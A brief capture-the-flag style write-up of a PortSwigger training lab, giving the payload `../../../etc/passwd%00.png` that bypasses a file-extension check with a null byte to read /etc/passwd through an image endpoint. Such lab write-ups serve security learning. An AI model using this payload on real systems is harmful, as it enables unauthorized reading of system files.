# Lab Writeup: File path traversal, validation of file extension with null byte bypass

URL: https://portswigger.net/web-security/learning-paths/path-traversal/common-obstacles-to-exploiting-path-traversal-vulnerabilities/file-path-traversal/lab-validate-file-extension-null-byte-bypass

## Description

This lab contains a path traversal vulnerability in the display of product images.

The application validates that the supplied filename ends with the expected file extension.

To solve the lab, retrieve the contents of the `/etc/passwd` file.

## Solution

1. Open in new tab one of the images e.g: `https://0a80000c03ffe99d885933f7004500eb.web-security-academy.net/image?filename=6.jpg`
2. Change the filename param to become `../../../etc/passwd%00.png` using burp repeater. Note that you have to include `.png` also the null byte to nullify the value of `.png` (bc the program validates it) which is `%00.png`. Here's the full path `/image?filename=../../../etc/passwd%00.png`
3. Send the request, get all the file's contents and the challenge is solved

   ![Extension Path Traversal](/assets/extension-path-traversal.png)
